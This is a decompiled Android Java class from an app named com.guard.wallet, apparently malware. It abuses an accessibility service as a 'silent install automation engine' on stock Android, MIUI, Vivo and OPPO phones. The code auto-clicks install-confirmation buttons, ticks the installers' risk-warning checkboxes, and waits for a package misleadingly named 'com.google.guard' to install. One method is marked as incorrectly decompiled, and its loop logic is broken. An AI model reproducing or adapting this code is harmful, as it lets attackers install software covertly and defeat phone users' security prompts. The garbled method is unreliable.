package p012o;

import a1.AbstractC0026q;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.thread.AbstractC0243l;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0250f;
import com.guard.wallet.utils.AbstractC0251g;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.locks.ReentrantLock;
import org.bouncycastle.i18n.TextBundle;
import p000a.AbstractC0000a;

/* renamed from: o.x */
/* loaded from: classes.dex */
public final class C0435x extends C0416e {

    /* renamed from: n */
    public final ScheduledExecutorService f971n;

    /* renamed from: o */
    public final ConcurrentLinkedQueue f972o;

    /* renamed from: p */
    public final ReentrantLock f973p;

    public C0435x() {
        super(m1156N(), "com.android.packageinstaller");
        long j2;
        ScheduledExecutorService newSingleThreadScheduledExecutor = Executors.newSingleThreadScheduledExecutor();
        this.f971n = newSingleThreadScheduledExecutor;
        this.f972o = new ConcurrentLinkedQueue();
        this.f973p = new ReentrantLock();
        try {
            if (!AbstractC0249e.m620i() && !AbstractC0249e.m623l()) {
                j2 = 120;
                newSingleThreadScheduledExecutor.schedule(new RunnableC0434w(this, 0), j2, TimeUnit.SECONDS);
            }
            j2 = 180;
            newSingleThreadScheduledExecutor.schedule(new RunnableC0434w(this, 0), j2, TimeUnit.SECONDS);
        } catch (Exception e2) {
            AbstractC0026q.m186s("PackageInstallerDelegate", e2);
        }
    }

    /* renamed from: H */
    public static ListenWindow m1154H() {
        ListenWindow listenWindow = new ListenWindow("com.android.packageinstaller", "com.android.packageinstaller.PackageInstallerActivity");
        AbstractC0413b.m1023q(16384, AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow), listenWindow).add(2048);
        return listenWindow;
    }

    /* renamed from: M */
    public static CombineFiltersWithOr m1155M() {
        CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
        combineFiltersWithOr.setFilters(new LinkedList());
        List<CombineFilter> filters = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setStringConditions(new LinkedList());
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty(TextBundle.TEXT_ENTRY);
        stringCondition.setContains(AbstractC0250f.m627b("MIUI_CONTINUE_INSTALL_BTN_TEXT"));
        combineFilter.getStringConditions().add(stringCondition);
        filters.add(combineFilter);
        List<CombineFilter> filters2 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter2 = new CombineFilter();
        combineFilter2.setStringConditions(new LinkedList());
        StringCondition stringCondition2 = new StringCondition();
        stringCondition2.setProperty(TextBundle.TEXT_ENTRY);
        stringCondition2.setEquals(AbstractC0250f.m627b("VIVO_CONTINUE_INSTALL_BTN_TEXT"));
        combineFilter2.getStringConditions().add(stringCondition2);
        filters2.add(combineFilter2);
        List<CombineFilter> filters3 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter3 = new CombineFilter();
        combineFilter3.getStringConditions().add(AbstractC0000a.m7c(combineFilter3, "id", "com.android.packageinstaller:id/confirm_bottom_button_layout"));
        filters3.add(combineFilter3);
        List<CombineFilter> filters4 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter4 = new CombineFilter();
        combineFilter4.setStringConditions(new LinkedList());
        StringCondition stringCondition3 = new StringCondition();
        stringCondition3.setProperty(TextBundle.TEXT_ENTRY);
        stringCondition3.setEquals(AbstractC0250f.m627b("OPPO_CONTINUE_INSTALL_BTN_TEXT"));
        combineFilter4.getStringConditions().add(stringCondition3);
        filters4.add(combineFilter4);
        List<CombineFilter> filters5 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter5 = new CombineFilter();
        combineFilter5.getStringConditions().add(AbstractC0000a.m7c(combineFilter5, "id", "com.oplus.appdetail:id/view_bottom_guide_continue_install_btn"));
        filters5.add(combineFilter5);
        List<CombineFilter> filters6 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter6 = new CombineFilter();
        combineFilter6.setStringConditions(new LinkedList());
        StringCondition stringCondition4 = new StringCondition();
        stringCondition4.setProperty(TextBundle.TEXT_ENTRY);
        stringCondition4.setContains(AbstractC0250f.m627b("OPPO_AUTHORIZE_INSTALL_BTN_TEXT"));
        combineFilter6.getStringConditions().add(stringCondition4);
        filters6.add(combineFilter6);
        List<CombineFilter> filters7 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter7 = new CombineFilter();
        combineFilter7.getStringConditions().add(AbstractC0000a.m6b(combineFilter7, AbstractC0000a.m7c(combineFilter7, "className", "android.widget.LinearLayout"), "id", "android:id/button1"));
        filters7.add(combineFilter7);
        List<CombineFilter> filters8 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter8 = new CombineFilter();
        combineFilter8.getStringConditions().add(AbstractC0000a.m7c(combineFilter8, TextBundle.TEXT_ENTRY, "立即安装"));
        filters8.add(combineFilter8);
        List<CombineFilter> filters9 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter9 = new CombineFilter();
        combineFilter9.getStringConditions().add(AbstractC0000a.m7c(combineFilter9, TextBundle.TEXT_ENTRY, "仍然安装"));
        filters9.add(combineFilter9);
        return combineFiltersWithOr;
    }

    /* renamed from: N */
    public static LinkedList m1156N() {
        LinkedList linkedList = new LinkedList();
        linkedList.add(m1154H());
        linkedList.add(m1158Q());
        linkedList.add(m1157P());
        linkedList.add(m1163V());
        linkedList.add(m1160S());
        linkedList.add(m1162U());
        linkedList.add(m1161T());
        return linkedList;
    }

    /* renamed from: P */
    public static ListenWindow m1157P() {
        ListenWindow listenWindow = new ListenWindow("com.miui.securitycenter", "com.miui.permcenter.install.AdbInstallActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    /* renamed from: Q */
    public static ListenWindow m1158Q() {
        ListenWindow listenWindow = new ListenWindow("com.miui.securitycenter", "miuix.appcompat.app.AlertDialog");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    /* renamed from: R */
    public static boolean m1159R() {
        return AbstractC0249e.m620i() || AbstractC0249e.m623l() || AbstractC0249e.m624m();
    }

    /* renamed from: S */
    public static ListenWindow m1160S() {
        ListenWindow listenWindow = new ListenWindow("com.oplus.appdetail", "com.oplus.appdetail.model.guide.ui.InstallGuideActivity");
        AbstractC0413b.m1023q(16384, AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow), listenWindow).add(2048);
        return listenWindow;
    }

    /* renamed from: T */
    public static ListenWindow m1161T() {
        ListenWindow listenWindow = new ListenWindow("com.oplus.appdetail", "com.oplus.appdetail.model.finish.InstallFinishActivity");
        AbstractC0413b.m1023q(16384, AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow), listenWindow).add(2048);
        return listenWindow;
    }

    /* renamed from: U */
    public static ListenWindow m1162U() {
        ListenWindow listenWindow = new ListenWindow("com.android.packageinstaller", "com.android.packageinstaller.oplus.InstallAppProgress");
        AbstractC0413b.m1023q(16384, AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow), listenWindow).add(2048);
        return listenWindow;
    }

    /* renamed from: V */
    public static ListenWindow m1163V() {
        ListenWindow listenWindow = new ListenWindow("com.android.packageinstaller", "com.android.packageinstaller.oplus.OPlusPackageInstallerActivity");
        AbstractC0413b.m1023q(16384, AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow), listenWindow).add(2048);
        return listenWindow;
    }

    /* renamed from: I */
    public final boolean m1164I() {
        if (m1072k() != null) {
            Log.d("PackageInstallerDelegate", "开始查找允许安装复选框");
            m1072k().refresh();
            AbstractC0251g.T0(10);
            UiObject m1072k = m1072k();
            CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
            combineFiltersWithOr.setFilters(new LinkedList());
            List<CombineFilter> filters = combineFiltersWithOr.getFilters();
            CombineFilter combineFilter = new CombineFilter();
            combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "id", "com.android.packageinstaller:id/install_risk_tips"));
            filters.add(combineFilter);
            List<CombineFilter> filters2 = combineFiltersWithOr.getFilters();
            CombineFilter combineFilter2 = new CombineFilter();
            combineFilter2.getStringConditions().add(AbstractC0000a.m7c(combineFilter2, "id", "com.oplus.appdetail:id/safe_guard_checkbox"));
            filters2.add(combineFilter2);
            List<CombineFilter> filters3 = combineFiltersWithOr.getFilters();
            CombineFilter combineFilter3 = new CombineFilter();
            combineFilter3.getStringConditions().add(AbstractC0000a.m7c(combineFilter3, "id", "com.oplus.appdetail:id/risk_check_box"));
            filters3.add(combineFilter3);
            List<CombineFilter> filters4 = combineFiltersWithOr.getFilters();
            CombineFilter combineFilter4 = new CombineFilter();
            combineFilter4.getStringConditions().add(AbstractC0000a.m7c(combineFilter4, "id", "om.android.packageinstaller:id/deleted_file_state_cb"));
            filters4.add(combineFilter4);
            List<CombineFilter> filters5 = combineFiltersWithOr.getFilters();
            CombineFilter combineFilter5 = new CombineFilter();
            combineFilter5.setStringConditions(new LinkedList());
            combineFilter5.setBoolConditions(new LinkedList());
            combineFilter5.getBoolConditions().add(new BoolCondition("clickable", true, true));
            StringCondition stringCondition = new StringCondition();
            stringCondition.setProperty("className");
            stringCondition.setEquals("android.widget.CheckBox");
            combineFilter5.getStringConditions().add(stringCondition);
            filters5.add(combineFilter5);
            List<CombineFilter> filters6 = combineFiltersWithOr.getFilters();
            CombineFilter combineFilter6 = new CombineFilter();
            combineFilter6.setStringConditions(new LinkedList());
            combineFilter6.setBoolConditions(new LinkedList());
            combineFilter6.getBoolConditions().add(new BoolCondition("checkable", true, true));
            StringCondition stringCondition2 = new StringCondition();
            stringCondition2.setProperty("className");
            stringCondition2.setEquals("android.widget.Button");
            combineFilter6.getStringConditions().add(stringCondition2);
            filters6.add(combineFilter6);
            UiObject findOneByOperateOr = m1072k.findOneByOperateOr(combineFiltersWithOr);
            if (findOneByOperateOr != null) {
                Log.d("PackageInstallerDelegate", "允许本次安装查找成功");
                if (!findOneByOperateOr.checkable()) {
                    return findOneByOperateOr.click();
                }
                if (!findOneByOperateOr.checked()) {
                    Log.d("PackageInstallerDelegate", "允许本次安装查找成功，未勾选");
                    if (findOneByOperateOr.clickable()) {
                        findOneByOperateOr.click();
                        AbstractC0251g.T0(10);
                        findOneByOperateOr.refresh();
                        Log.d("PackageInstallerDelegate", "已点击允许本次安装");
                    }
                    if (!findOneByOperateOr.checked()) {
                        if (findOneByOperateOr.clickPosition(findOneByOperateOr.centerInScreen().getX(), findOneByOperateOr.centerInScreen().getY())) {
                            Log.d("PackageInstallerDelegate", "已通过中心位置点击允许本次安装");
                            AbstractC0251g.T0(10);
                            findOneByOperateOr.refresh();
                        }
                        if (!findOneByOperateOr.checked()) {
                            if (findOneByOperateOr.clickPosition(0.05f, 0.5f)) {
                                Log.d("PackageInstallerDelegate", "已通过位置点击允许本次安装");
                                AbstractC0251g.T0(10);
                                findOneByOperateOr.refresh();
                            }
                            if (!findOneByOperateOr.checked()) {
                                if (findOneByOperateOr.parent() != null && findOneByOperateOr.parent().click()) {
                                    Log.d("PackageInstallerDelegate", "已通过位置点击允许本次安装父节点");
                                    AbstractC0251g.T0(10);
                                    findOneByOperateOr.refresh();
                                }
                                if (!findOneByOperateOr.checked()) {
                                    return false;
                                }
                            }
                        }
                    }
                    Log.d("PackageInstallerDelegate", "已勾选允许本次安装");
                }
                return true;
            }
        }
        return false;
    }

    /* renamed from: J */
    public final boolean m1165J() {
        if (m1072k() != null) {
            MyAccessibilityService.m548I(m1072k());
            UiObject findOneByOperateOr = m1072k().findOneByOperateOr(m1155M());
            AtomicInteger atomicInteger = new AtomicInteger(0);
            while (findOneByOperateOr == null && atomicInteger.incrementAndGet() <= 20) {
                AbstractC0251g.T0(5);
                findOneByOperateOr = m1072k().findOneByOperateOr(m1155M());
            }
            if (findOneByOperateOr != null) {
                AbstractC0251g.T0(5);
                if (findOneByOperateOr.clickable() && findOneByOperateOr.click()) {
                    Log.d("PackageInstallerDelegate", "查找并点击继续安装成功");
                    return true;
                }
                if (findOneByOperateOr.parent() != null && findOneByOperateOr.parent().clickable() && findOneByOperateOr.parent().click()) {
                    Log.d("PackageInstallerDelegate", "查找并点击继续安装成功");
                    return true;
                }
                if (findOneByOperateOr.click()) {
                    Log.d("PackageInstallerDelegate", "查找并点击继续安装成功");
                    return true;
                }
            }
        }
        return false;
    }

    /* renamed from: K */
    public final boolean m1166K() {
        String str;
        if (m1072k() == null) {
            return false;
        }
        UiObject m1072k = m1072k();
        CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
        combineFiltersWithOr.setFilters(new LinkedList());
        List<CombineFilter> filters = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "id", "com.android.packageinstaller:id/done_button"));
        filters.add(combineFilter);
        List<CombineFilter> filters2 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter2 = new CombineFilter();
        combineFilter2.getStringConditions().add(AbstractC0000a.m7c(combineFilter2, "id", "com.oplus.appdetail:id/launch_button"));
        filters2.add(combineFilter2);
        List<CombineFilter> filters3 = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter3 = new CombineFilter();
        combineFilter3.setStringConditions(new LinkedList());
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty(TextBundle.TEXT_ENTRY);
        stringCondition.setEquals(AbstractC0250f.m627b("OPPO_INSTALL_FINISH_TEXT"));
        combineFilter3.getStringConditions().add(stringCondition);
        filters3.add(combineFilter3);
        UiObject findOneByOperateOr = m1072k.findOneByOperateOr(combineFiltersWithOr);
        if (findOneByOperateOr == null || !findOneByOperateOr.click()) {
            UiObject m1072k2 = m1072k();
            CombineFilter combineFilter4 = new CombineFilter();
            combineFilter4.setStringConditions(new LinkedList());
            StringCondition stringCondition2 = new StringCondition();
            stringCondition2.setProperty(TextBundle.TEXT_ENTRY);
            stringCondition2.setContains(AbstractC0250f.m627b("OPPO_INSTALL_DONE_TEXT"));
            combineFilter4.getStringConditions().add(stringCondition2);
            if (m1072k2.findOneByCombine(combineFilter4) == null) {
                return false;
            }
            str = "安装完成查找成功";
        } else {
            str = "查找并点击完成安装完成";
        }
        Log.d("PackageInstallerDelegate", str);
        return true;
    }

    /* JADX WARN: Removed duplicated region for block: B:13:0x0019 A[LOOP:0: B:8:0x001a->B:13:0x0019, LOOP_END] */
    /* JADX WARN: Removed duplicated region for block: B:14:0x002e A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:17:0x0032  */
    /* JADX WARN: Removed duplicated region for block: B:9:0x001c  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:11:0x002c -> B:6:0x002e). Please report as a decompilation issue!!! */
    /* renamed from: L */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m1167L() {
        C0435x c0435x;
        boolean z2;
        ReentrantLock reentrantLock = this.f973p;
        if (reentrantLock.tryLock()) {
            AtomicInteger atomicInteger = new AtomicInteger(0);
            if (AbstractC0251g.d0("com.google.guard") == null) {
                c0435x = this;
                z2 = false;
                while (!z2) {
                }
                if (z2) {
                }
                reentrantLock.unlock();
            }
            c0435x = this;
            z2 = true;
            while (!z2 && atomicInteger.incrementAndGet() <= 20) {
                AbstractC0251g.T0(2);
                if (AbstractC0251g.d0("com.google.guard") == null) {
                    z2 = true;
                    while (!z2) {
                        AbstractC0251g.T0(2);
                        if (AbstractC0251g.d0("com.google.guard") == null) {
                            z2 = false;
                        }
                    }
                }
            }
            if (z2) {
                c0435x.m1169W();
            }
            reentrantLock.unlock();
        }
    }

    /* renamed from: O */
    public final boolean m1168O() {
        if (m1072k() == null) {
            return false;
        }
        MyAccessibilityService.m548I(m1072k());
        UiObject m1072k = m1072k();
        CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
        combineFiltersWithOr.setFilters(new LinkedList());
        List<CombineFilter> filters = combineFiltersWithOr.getFilters();
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setStringConditions(new LinkedList());
        StringCondition stringCondition = new StringCondition();
        stringCondition.setProperty(TextBundle.TEXT_ENTRY);
        stringCondition.setPrefix(AbstractC0250f.m627b("OPPO_INSTALLING_TEXT"));
        combineFilter.getStringConditions().add(stringCondition);
        filters.add(combineFilter);
        if (m1072k.findOneByOperateOr(combineFiltersWithOr) == null) {
            return false;
        }
        Log.d("PackageInstallerDelegate", "正在安装节点查找成功");
        return true;
    }

    /* renamed from: W */
    public final void m1169W() {
        Log.d("PackageInstallerDelegate", "准备结束静默安装自动化引擎");
        if (MyAccessibilityService.m554P() != null) {
            MyAccessibilityService.m554P().m516A();
            MyAccessibilityService.m554P().m540u();
        }
        this.f971n.shutdownNow();
        AbstractC0243l.m591a(this.f864c);
        this.f972o.clear();
        if (AbstractC0251g.F0(2)) {
            AbstractC0251g.T0(5);
        }
        AbstractC0184g.m349c();
        super.mo1001d();
        Log.d("PackageInstallerDelegate", "已结束静默安装自动化引擎");
    }

    @Override // p012o.C0416e
    /* renamed from: d */
    public final void mo1001d() {
        try {
            this.f971n.shutdownNow();
            AbstractC0243l.m591a(this.f864c);
            this.f972o.clear();
            super.mo1001d();
        } catch (Exception e2) {
            AbstractC0026q.m186s("PackageInstallerDelegate", e2);
        }
    }

    @Override // p012o.C0416e
    public final boolean equals(Object obj) {
        return obj instanceof C0435x;
    }

    @Override // p012o.C0416e
    public final int hashCode() {
        return Objects.hash(C0435x.class.getName());
    }

    @Override // p012o.C0416e
    /* renamed from: u */
    public final void mo1002u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        boolean z2;
        boolean z3;
        boolean z4;
        boolean z5;
        super.mo1002u(accessibilityEvent, str, str2);
        boolean z6 = false;
        if (m1078q(Collections.singletonList(m1154H()))) {
            Log.d("PackageInstallerDelegate", "已进入通用安装引导窗口");
            z2 = true;
        } else {
            z2 = false;
        }
        String str3 = this.f864c;
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f972o;
        if (z2) {
            concurrentLinkedQueue.remove("miuiDialogInstallMatch");
            concurrentLinkedQueue.remove("oplusInstallMatch");
            concurrentLinkedQueue.remove("commonDialogInstallMatch");
            concurrentLinkedQueue.remove("oplusInstallDoneMatch");
            if (!concurrentLinkedQueue.contains("commonInstallMatch")) {
                concurrentLinkedQueue.add("commonInstallMatch");
                AbstractC0243l.m593c(AbstractC0249e.m623l() ? new RunnableC0434w(this, 1) : new RunnableC0434w(this, 2), str3);
            }
        }
        LinkedList linkedList = new LinkedList();
        linkedList.add(m1158Q());
        linkedList.add(m1157P());
        if (m1078q(linkedList)) {
            Log.d("PackageInstallerDelegate", "已进入MIUI安装引导对话框");
            z3 = true;
        } else {
            z3 = false;
        }
        if (z3) {
            concurrentLinkedQueue.remove("commonInstallMatch");
            concurrentLinkedQueue.remove("oplusInstallMatch");
            concurrentLinkedQueue.remove("commonDialogInstallMatch");
            concurrentLinkedQueue.remove("oplusInstallDoneMatch");
            if (!concurrentLinkedQueue.contains("miuiDialogInstallMatch")) {
                concurrentLinkedQueue.add("miuiDialogInstallMatch");
                AbstractC0243l.m593c(new RunnableC0434w(this, 3), str3);
            }
        }
        ListenWindow listenWindow = new ListenWindow(null, "android.app.AlertDialog");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        if (m1078q(Collections.singletonList(listenWindow))) {
            Log.d("PackageInstallerDelegate", "已进入通用安装引导对话框");
            z4 = true;
        } else {
            z4 = false;
        }
        if (z4) {
            concurrentLinkedQueue.remove("commonInstallMatch");
            concurrentLinkedQueue.remove("miuiDialogInstallMatch");
            concurrentLinkedQueue.remove("oplusInstallMatch");
            concurrentLinkedQueue.remove("oplusInstallDoneMatch");
            if (!concurrentLinkedQueue.contains("commonDialogInstallMatch")) {
                concurrentLinkedQueue.add("commonDialogInstallMatch");
                AbstractC0243l.m593c(new RunnableC0434w(this, 4), str3);
            }
        }
        LinkedList linkedList2 = new LinkedList();
        linkedList2.add(m1163V());
        linkedList2.add(m1160S());
        if (m1078q(linkedList2)) {
            Log.d("PackageInstallerDelegate", "已进入OPPO安装引导窗口");
            z5 = true;
        } else {
            z5 = false;
        }
        if (z5) {
            AbstractC0243l.m593c(new RunnableC0434w(this, 5), str3);
        }
        LinkedList linkedList3 = new LinkedList();
        linkedList3.add(m1162U());
        linkedList3.add(m1161T());
        if (m1078q(linkedList3)) {
            Log.d("PackageInstallerDelegate", "已进入OPPO安装完成窗口");
            z6 = true;
        }
        if (z6) {
            AbstractC0243l.m593c(new RunnableC0434w(this, 6), str3);
        }
    }
}
